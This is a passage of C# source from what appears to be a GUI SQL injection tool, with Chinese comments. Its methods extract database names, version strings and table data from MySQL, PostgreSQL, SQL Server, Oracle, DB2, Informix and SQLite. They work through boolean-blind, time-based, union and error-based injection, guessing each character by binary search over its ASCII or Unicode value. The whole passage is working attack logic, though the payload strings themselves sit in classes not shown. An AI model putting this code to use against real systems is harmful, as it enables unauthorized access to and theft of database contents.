                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);
                String va_payload = PostgreSQL.getBoolDataBySleep(PostgreSQL.bool_value, config.maxTime).Replace("{data}", vs[1]);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 32, 126);
                    value += ((char)ascii).ToString();
                    this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), vs[0], value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);


            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);

        }

        public void getVariableByBoolByInformixSleep(Object vers)
        {
            try
            {
                String[] vs = vers.ToString().Split(DBVers_Splite_Str);

                String payload_len = Informix.getBoolDataBySleep(Informix.bool_length).Replace("{data}", vs[1]);

                int len = getValueByStepUp(payload_len, 0, 10);
                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);
                String va_payload = Informix.getBoolDataBySleep(Informix.bool_value).Replace("{data}", vs[1]);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 32, 126);
                    value += ((char)ascii).ToString();
                    this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), vs[0], value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);


            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);

        }

        /// <summary>
        /// 获取环境变量PostgreSQL bool
        /// </summary>
        /// <param name="vers"></param>
        public void getVariableByBoolByPostgreSQL(Object vers)
        {
            try
            {
                String[] vs = vers.ToString().Split(DBVers_Splite_Str);
                String payload_len = PostgreSQL.ver_length.Replace("{data}", vs[1]);
                int len = getValueByStepUp(payload_len, 0, 10);
                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);
                String va_payload = PostgreSQL.ver_value.Replace("{data}", vs[1]);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 32, 126);
                    value += ((char)ascii).ToString();
                    this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), vs[0], value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);


            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }

        /// <summary>
        /// 获取环境变量sqlserver bool sleep
        /// </summary>
        /// <param name="vers"></param>
        public void getVariableByBoolBySQLServerSleep(Object vers)
        {
            try
            {
                String[] vs = vers.ToString().Split(DBVers_Splite_Str);
                //判断变量长度
                String payload_len = SQLServer.getBoolDataBySleep(SQLServer.bool_length, config.maxTime).Replace("{data}", vs[1]);
                int len = getValueByStepUp(payload_len, 0, 10);
                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);
                String va_payload = SQLServer.getBoolDataBySleep(SQLServer.bool_value, config.maxTime).Replace("{data}", vs[1]);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    //select UNICODE(substring(@@version,{index},1))
                    //取值payload，替换对应下标值
                    String unicode_data_payload = SQLServer.nocast_unicode_value.Replace("{index}", i + "").Replace("{data}", vs[1] + "");
                    int unicode = getValue(SQLServer.getBoolDataBySleep(SQLServer.bool_value.Replace("{data}", unicode_data_payload), config.maxTime), 32, 126);
                    //设置值,这里由于是unicode值，需要转换 
                    value += Tools.unHexByUnicode(unicode, config.db_encoding);
                    this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), vs[0], value);

                }
                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);


            }
            catch (Exception e)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }
        /// <summary>
        /// 获取环境变量sqlserver bool
        /// </summary>
        /// <param name="vers"></param>
        public void getVariableByBoolBySQLServer(Object vers)
        {
            try
            {
                String[] vs = vers.ToString().Split(DBVers_Splite_Str);
                //判断变量长度
                int len = getValueByStepUp(SQLServer.bool_length.Replace("{data}", vs[1]), 0, 10);
                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {

                    //select UNICODE(substring(@@version,{index},1))
                    //取值payload，替换对应下标值
                    String unicode_data_payload = SQLServer.nocast_unicode_value.Replace("{index}", i + "").Replace("{data}", vs[1] + "");
                    int unicode = getValue(SQLServer.bool_value.Replace("{data}", unicode_data_payload), 32, 126);

                    //设置值,这里由于是unicode值，需要转换 
                    value += Tools.unHexByUnicode(unicode, config.db_encoding);

                    this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), vs[0], value);
                }

                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);


            }
            catch (Exception e)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }


        /// <summary>
        /// 获取环境变量oracle bool
        /// </summary>
        /// <param name="vers"></param>
        public void getVariableByBoolByOracle(Object vers)
        {
            try
            {
                String[] vs = vers.ToString().Split(DBVers_Splite_Str);
                //判断变量长度
                int len = getValueByStepUp(Oracle.bool_length.Replace("{data}", vs[1]), 0, 10);
                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);

                String va_payload = Oracle.bool_value.Replace("{data}", vs[1]);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    String dp = va_payload.Replace("{index}", i.ToString());
                    int ascii = getValue(dp, 32, 126);
                    value += (char)ascii;
                    this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), vs[0], value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);


            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }

        /// <summary>
        /// 获取环境变量DB2 bool
        /// </summary>
        /// <param name="vers"></param>
        public void getVariableByBoolByDB2(Object vers)
        {
            try
            {
                String[] vs = vers.ToString().Split(DBVers_Splite_Str);
                //判断变量长度
                int len = getValueByStepUp(DB2.bool_length.Replace("{data}", vs[1]), 0, 10);
                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);

                String va_payload = DB2.bool_value.Replace("{data}", vs[1]);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    String dp = va_payload.Replace("{index}", i.ToString());
                    int ascii = getValue(dp, 32, 126);
                    value += (char)ascii;
                    this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), vs[0], value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);


            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }

        /// <summary>
        /// 获取环境变量DB2 bool
        /// </summary>
        /// <param name="vers"></param>
        public void getVariableByBoolByInformix(Object vers)
        {
            try
            {
                String[] vs = vers.ToString().Split(DBVers_Splite_Str);
                //判断变量长度
                int len = getValueByStepUp(Informix.bool_length.Replace("{data}", vs[1]), 0, 10);
                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);

                String va_payload = Informix.bool_value.Replace("{data}", vs[1]);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    String dp = va_payload.Replace("{index}", i.ToString());
                    int ascii = getValue(dp, 32, 126);
                    value += (char)ascii;
                    this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), vs[0], value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);

            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }

        /// <summary>
        /// 获取环境变量sqlite bool
        /// </summary>
        /// <param name="vers"></param>
        public void getVariableByBoolBySQLite(Object vers)
        {
            try
            {
                String[] vs = vers.ToString().Split(DBVers_Splite_Str);
                //判断变量长度
                int len = getValueByStepUp(SQLite.bool_length.Replace("{data}", vs[1]), 0, 10);
                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "长度为：" + len, LogLevel.info);

                String va_payload = SQLite.bool_value.Replace("{data}", vs[1]);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    String dp = va_payload.Replace("{index}", i.ToString());
                    int ascii = getValue(dp, 32, 126);
                    value += (char)ascii;
                    this.data_lvw_ver.Invoke(new setVariableDelegate(setVariable), vs[0], value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), vs[0] + "值为：" + value, LogLevel.info);


            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }

        delegate void addItemToListViewDelegate(ListViewItem item);

        public void addItemToListView(ListViewItem item)
        {
            this.data_dbs_lvw_data.Items.Add(item);
        }

        delegate void addItemToListViewByColumnsDelegate(String colvs);

        public void addItemToListViewBySQLServerXMLData(String xmldata, List<String> columns)
        {
            try
            {
                ListViewItem lvi = new ListViewItem();
                XmlDocument xml = new XmlDocument();
                xml.LoadXml(xmldata);
                XmlNodeList lines = xml.ChildNodes;
                bool haveData = false;
                for (int i = 1; i < columns.Count; i++)
                {
                    lvi.SubItems.Add("");
                }
                if (lines.Count == 1)
                {
                    XmlAttributeCollection abs = lines[0].Attributes;
                    foreach (XmlAttribute attr in abs)
                    {
                        int index = Tools.FindItemWithIgnoreCase(columns, attr.Name);
                        if (index != -1)
                        {
                            haveData = true;
                            lvi.SubItems[index].Text = HttpUtility.HtmlDecode(attr.Value);
                        }
                    }
                }
                if (haveData)
                {
                    this.Invoke(new addItemToListViewDelegate(addItemToListView), lvi);
                }
            }
            catch (Exception e)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "解析SQLServer注入数据，并添加到ListView发生错误！" + e.Message, LogLevel.waring);
            }

        }

        public void addItemToListViewByColumns(String colvs)
        {
            addItemToListViewByColumns(colvs, "\\$\\$\\$");
        }

        public void addItemToListViewByColumnsInformix(String colvs)
        {
            addItemToListViewByColumns(colvs, Informix.mid);
        }

        public void addItemToListViewByColumns(String colvs, String splitReg)
        {
            String[] colv = Regex.Split(colvs, splitReg);
            ListViewItem lvi = null;
            for (int i = 0; i < colv.Length; i++)
            {
                if (lvi == null)
                {
                    lvi = new ListViewItem(colv[i]);
                }
                else
                {

                    lvi.SubItems.Add(colv[i]);
                }
            }
            this.data_dbs_lvw_data.Items.Add(lvi);
        }

        /// <summary>
        /// 获取数据库名称
        /// </summary>
        /// <param name="oindex">下标limit</param>
        public void getDBNameByBoolByMySQL(Object oindex)
        {
            try
            {
                int db_index = int.Parse(oindex.ToString());
                //判断对应下标的数据库长度
                String payload_len = MySQL.ver_length.Replace("{data}", MySQL.db_value.Replace("{index}", oindex.ToString()));
                if (config.keyType.Equals(KeyType.Time))
                {
                    payload_len = MySQL.getBoolDataBySleep(MySQL.bool_length.Replace("{data}", MySQL.db_value.Replace("{index}", oindex.ToString())), config.maxTime);
                }


                //判断当前数据库长度限制1-50
                int len = getValue(payload_len, 1, 50);
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + (db_index + 1) + "长度为：" + len, LogLevel.info);

                //判断当前数据库对应的ascii码
                String va_payload = MySQL.ver_value.Replace("{data}", MySQL.db_value.Replace("{index}", oindex.ToString()));
                if (config.keyType.Equals(KeyType.Time))
                {
                    va_payload = MySQL.getBoolDataBySleep(MySQL.bool_value.Replace("{data}", MySQL.db_value.Replace("{index}", oindex.ToString())), config.maxTime);
                }
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    if (status != 1)
                    {
                        break;
                    }
                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 32, 126);
                    value += ((char)ascii).ToString();
                    this.Invoke(new setDBToTreeListDelegate(setDBToTreeList), db_index, value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + db_index + "的名称为：" + value, LogLevel.info);


            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDbsCount);
        }


        /// <summary>
        /// PostgreSQL获取数据库名称
        /// </summary>
        /// <param name="oindex">下标limit</param>
        public void getDBNameByBoolByPostgreSQL(Object oindex)
        {
            try
            {
                int db_index = int.Parse(oindex.ToString());
                //判断对应下标的数据库长度
                String payload_len = PostgreSQL.ver_length.Replace("{data}", PostgreSQL.db_value.Replace("{index}", oindex.ToString()));
                if (config.keyType.Equals(KeyType.Time))
                {
                    payload_len = PostgreSQL.getBoolDataBySleep(PostgreSQL.bool_length.Replace("{data}", PostgreSQL.db_value.Replace("{index}", oindex.ToString())), config.maxTime);
                }


                //判断当前数据库长度限制1-50
                int len = getValue(payload_len, 1, 50);
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + (db_index + 1) + "长度为：" + len, LogLevel.info);

                //判断当前数据库对应的ascii码
                String va_payload = PostgreSQL.ver_value.Replace("{data}", PostgreSQL.db_value.Replace("{index}", oindex.ToString()));
                if (config.keyType.Equals(KeyType.Time))
                {
                    va_payload = PostgreSQL.getBoolDataBySleep(PostgreSQL.bool_value.Replace("{data}", PostgreSQL.db_value.Replace("{index}", oindex.ToString())), config.maxTime);
                }
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    if (status != 1)
                    {
                        break;
                    }
                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 32, 126);
                    value += ((char)ascii).ToString();
                    this.Invoke(new setDBToTreeListDelegate(setDBToTreeList), db_index, value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + db_index + "的名称为：" + value, LogLevel.info);


            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDbsCount);
        }


        /// <summary>
        /// 获取数据库名称mssql
        /// </summary>
        /// <param name="oindex">下标</param>
        public void getDBNameByBoolBySQLServer(Object oindex)
        {
            try
            {
                int db_index = int.Parse(oindex.ToString());
                //判断对应下标的数据库长度
                String data_payload = SQLServer.db_value.Replace("{index}", db_index.ToString());
                int len = getValueByStepUp(SQLServer.bool_length.Replace("{data}", data_payload), 0, 10);

                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + db_index + "长度为：" + len, LogLevel.info);

                //判断当前数据库对应的ascii码
                String va_payload = SQLServer.bool_value.Replace("{data}", SQLServer.db_value.Replace("{index}", oindex.ToString()));
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    if (status != 1)
                    {
                        break;
                    }
                    //取值payload，替换对应下标值
                    //select UNICODE(substring(@@version,{index},1))
                    //取值payload，替换对应下标值
                    String unicode_data_payload = SQLServer.nocast_unicode_value.Replace("{index}", i + "").Replace("{data}", data_payload);
                    //取unicode转换后的长度
                    String unicode_data_len_payload = SQLServer.bool_length.Replace("{data}", unicode_data_payload);
                    //根据unicode值得长度确定范围在判断，提高效率
                    for (int j = 3; j <= 7; j++)
                    {
                        Boolean isLarge = checkLen(SQLServer.check_li_value.Replace("{data}", unicode_data_payload), j);
                        if (isLarge)
                        {
                            int end = (int)Math.Pow(10, j - 1) - 1;
                            int unicode = getValue(SQLServer.bool_value.Replace("{data}", unicode_data_payload), 0, end);
                            value += Tools.unHexByUnicode(unicode, config.db_encoding);
                            break;
                        }
                    }
                    this.Invoke(new setDBToTreeListDelegate(setDBToTreeList), db_index - 1, value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + db_index + "的名称为：" + value, LogLevel.info);


            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDbsCount);
        }

        /// <summary>
        /// 获取数据库名称mssql
        /// </summary>
        /// <param name="oindex">下标</param>
        public void getDBNameByBoolBySQLServerSleep(Object oindex)
        {
            try
            {
                int db_index = int.Parse(oindex.ToString());
                //判断对应下标的数据库长度
                String data_payload = SQLServer.db_value.Replace("{index}", db_index.ToString());
                int len = getValueByStepUp(SQLServer.getBoolDataBySleep(SQLServer.bool_length.Replace("{data}", data_payload), config.maxTime), 0, 10);

                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + db_index + "长度为：" + len, LogLevel.info);

                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    if (status != 1)
                    {
                        break;
                    }
                    //取值payload，替换对应下标值
                    //select UNICODE(substring(@@version,{index},1))
                    //取值payload，替换对应下标值
                    String unicode_data_payload = SQLServer.unicode_value.Replace("{index}", i + "").Replace("{data}", data_payload);
                    //取unicode转换后的长度
                    String unicode_data_len_payload = SQLServer.getBoolDataBySleep(SQLServer.bool_length.Replace("{data}", unicode_data_payload), config.maxTime);

                    //长度范围2-8支持大部分语言
                    int unicode_data_len = getValue(unicode_data_len_payload, 1, 8);
                    int m_index = 1;
                    StringBuilder unicodes = new StringBuilder();
                    while (m_index <= unicode_data_len && status == 1)
                    {
                        //获取多字节
                        String substr_payload = SQLServer.substr.Replace("{data}", unicode_data_payload).Replace("{index}", m_index.ToString());
                        //单个unicode值范围是0-9
                        int unicode = getValue(SQLServer.getBoolDataBySleep(SQLServer.bool_value.Replace("{data}", substr_payload), config.maxTime), 0, 9);
                        unicodes.Append(unicode.ToString());
                        m_index++;
                    }

                    if (Tools.convertToInt(unicodes.ToString()) > 255)
                    {
                        value += Tools.unHexByUnicode(int.Parse(unicodes.ToString()), config.db_encoding);
                    }
                    else
                    {
                        value += (char)Tools.convertToInt(unicodes.ToString());
                    }
                    this.Invoke(new setDBToTreeListDelegate(setDBToTreeList), db_index - 1, value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + db_index + "的名称为：" + value, LogLevel.info);

            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDbsCount);
        }

        /// <summary>
        /// 获取数据库名称
        /// </summary>
        /// <param name="oindex">下标limit</param>
        public void getDBNameByBoolByOracle(Object oindex)
        {
            try
            {
                int db_index = int.Parse(oindex.ToString());
                //判断对应下标的数据库长度
                String payload_len = Oracle.bool_length.Replace("{data}", Oracle.db_value.Replace("{index}", oindex.ToString()));

                //判断当前数据库长度限制1-50
                int len = getValue(payload_len, 1, 50);
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + (db_index) + "长度为：" + len, LogLevel.info);

                //判断当前数据库对应的ascii码
                String va_payload = Oracle.bool_value.Replace("{data}", Oracle.db_value.Replace("{index}", oindex.ToString()));
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    if (status != 1)
                    {
                        break;
                    }
                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 32, 126);
                    value += ((char)ascii).ToString();
                    this.Invoke(new setDBToTreeListDelegate(setDBToTreeList), db_index - 1, value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + db_index + "的名称为：" + value, LogLevel.info);


            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDbsCount);
        }

        /// <summary>
        /// 获取数据库名称
        /// </summary>
        /// <param name="oindex">下标limit</param>
        public void getDBNameByBoolByDB2(Object oindex)
        {
            try
            {
                int db_index = int.Parse(oindex.ToString());
                //判断对应下标的数据库长度
                String payload_len = DB2.bool_length.Replace("{data}", DB2.db_value.Replace("{index}", oindex.ToString()));

                //判断当前数据库长度限制1-50
                int len = getValue(payload_len, 1, 50);
                this.txt_log.Invoke(new showLogDelegate(log), "数据库表模式" + (db_index) + "长度为：" + len, LogLevel.info);

                //判断当前数据库对应的ascii码
                String va_payload = DB2.bool_value.Replace("{data}", DB2.db_value.Replace("{index}", oindex.ToString()));
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    if (status != 1)
                    {
                        break;
                    }
                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 32, 126);
                    value += ((char)ascii).ToString();
                    this.Invoke(new setDBToTreeListDelegate(setDBToTreeList), db_index - 1, value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + db_index + "的名称为：" + value, LogLevel.info);


            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDbsCount);
        }

        /// <summary>
        /// 获取数据库名称
        /// </summary>
        /// <param name="oindex">下标limit</param>
        public void getDBNameByBoolByInformix(Object oindex)
        {
            try
            {
                int db_index = int.Parse(oindex.ToString());
                //判断对应下标的数据库长度
                String payload_len = Informix.bool_length.Replace("{data}", Informix.db_value.Replace("{index}", oindex.ToString()));
                //判断当前数据库对应的ascii码
                String va_payload = Informix.bool_value.Replace("{data}", Informix.db_value.Replace("{index}", oindex.ToString()));

                if (config.keyType.Equals(KeyType.Time))
                {
                    payload_len = Informix.getBoolDataBySleep(Informix.bool_length.Replace("{data}", Informix.db_value.Replace("{index}", oindex.ToString())));
                    va_payload = Informix.getBoolDataBySleep(Informix.bool_value.Replace("{data}", Informix.db_value.Replace("{index}", oindex.ToString())));
                }

                //判断当前数据库长度限制1-50
                int len = getValue(payload_len, 1, 50);
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + (db_index + 1) + "长度为：" + len, LogLevel.info);

                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    if (status != 1)
                    {
                        break;
                    }
                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 32, 126);
                    value += ((char)ascii).ToString();
                    this.Invoke(new setDBToTreeListDelegate(setDBToTreeList), db_index, value);
                }
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + (db_index + 1) + "的名称为：" + value, LogLevel.info);
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDbsCount);
        }


        /// <summary>
        /// 获取数据库名称Union方式MySQL
        /// </summary>
        /// <param name="oindex">下标limit</param>
        public void getDBNameByUnionByMySQL(Object oindex)
        {
            try
            {
                //获取数据库数量
                int index = int.Parse(oindex.ToString());
                List<String> data_list = new List<String>();
                data_list.Add(MySQL.db_value.Replace("{index}", oindex.ToString()));
                String db_Name_data = MySQL.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, data_list, null, null, -1);
                String result = getOneDataByUnionOrError(MySQL.union_value.Replace("{data}", db_Name_data));
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + (index + 1) + "的名称为：" + result, LogLevel.info);
                this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), result);
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDbsCount);
        }

        /// <summary>
        /// 获取数据库名称Union方式SQLServer
        /// </summary>
        /// <param name="oindex">下标limit</param>
        public void getDBNameByUnionBySQLServer(Object oindex)
        {
            try
            {
                //获取数据库数量
                String result = getOneDataByUnionOrError(SQLServer.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, SQLServer.db_value, "", "", oindex.ToString()));
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + oindex + "的名称为：" + result, LogLevel.info);
                this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), result);
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDbsCount);
        }

        /// <summary>
        /// 获取数据库名称Union方式Oracle
        /// </summary>
        /// <param name="oindex">下标limit</param>
        public void getDBNameByUnionByOracle(Object oindex)
        {
            try
            {
                //获取数据库数量
                String result = getOneDataByUnionOrError(Oracle.getUnionDataValue(config.columnsCount, config.showColumn, Oracle.db_value, "", "", oindex.ToString()));
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + oindex + "的名称为：" + result, LogLevel.info);
                this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), result);
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDbsCount);
        }

        /// <summary>
        /// 获取数据库名称Union方式DB2
        /// </summary>
        /// <param name="oindex">下标limit</param>
        public void getDBNameByUnionByDB2(Object oindex)
        {
            try
            {
                //获取数据库数量

                String result = getOneDataByUnionOrError(DB2.getUnionDataValue(config.unionFillTemplate, DB2.db_value, "", "", oindex.ToString()));
                this.txt_log.Invoke(new showLogDelegate(log), "数据库表模式" + oindex + "的名称为：" + result, LogLevel.info);
                this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), result);
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDbsCount);
        }

        /// <summary>
        /// 获取数据库名称Union方式DB2
        /// </summary>
        /// <param name="oindex">下标limit</param>
        public void getDBNameByUnionByInformix(Object oindex)
        {
            try
            {
                //获取数据库数量
                int index = int.Parse(oindex.ToString());
                String result = getOneDataByUnionOrErrorByInformix(Informix.getUnionDataValue(config.unionFillTemplate, Informix.db_value, "", "", oindex.ToString(), Informix.cast_value));
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + (index + 1) + "的名称为：" + result, LogLevel.info);
                this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), result);
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDbsCount);
        }

        /// <summary>
        /// 获取数据库名称Union方式Oracle
        /// </summary>
        /// <param name="oindex">下标limit</param>
        public void getDBNameByUnionByPostgreSQL(Object oindex)
        {
            try
            {
                //获取数据库数量
                String result = getOneDataByUnionOrError(PostgreSQL.getUnionDataValue(config.columnsCount, config.showColumn, PostgreSQL.db_value, "", "", oindex.ToString()));
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + oindex + "的名称为：" + result, LogLevel.info);
                this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), result);
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDbsCount);
        }


        /// <summary>
        /// 获取数据库名称Error方式mysql
        /// </summary>
        /// <param name="oindex">下标limit</param>
        public void getDBNameByErrorByMySQL(Object oindex)
        {
            try
            {
                List<String> data_list = new List<String>();
                data_list.Add(MySQL.db_value.Replace("{index}", oindex.ToString()));
                String db_Name_data = MySQL.creatMySQLColumnsStrByError(data_list, null, null, -1);
                String result = getOneDataByUnionOrError(MySQL.error_value.Replace("{data}", db_Name_data));
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + oindex + "的名称为：" + result, LogLevel.info);
                this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), result);
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.info);
            }
            Interlocked.Increment(ref this.currentDbsCount);
        }

        /// <summary>
        /// 获取数据库名称Error方式SQLServer
        /// </summary>
        /// <param name="oindex">下标limit</param>
        public void getDBNameByErrorBySQLServer(Object oindex)
        {
            try
            {
                String result = getOneDataByUnionOrError(SQLServer.error_value.Replace("{data}", SQLServer.db_value.Replace("{index}", oindex.ToString())));
                //HTML解码
                result = HttpUtility.HtmlDecode(result);
                this.txt_log.Invoke(new showLogDelegate(log), "数据库" + oindex + "的名称为：" + result, LogLevel.info);
                this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), result);
            }
            catch (Exception e)
            {

                this.txt_log.Invoke(new showLogDelegate(log), "获取数据库名称时发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDbsCount);
        }

        /// <summary>
        /// 获取数据库名称Error方式PostgreSQL
        /// </summary>
        /// <param name="oindex">下标limit</param>
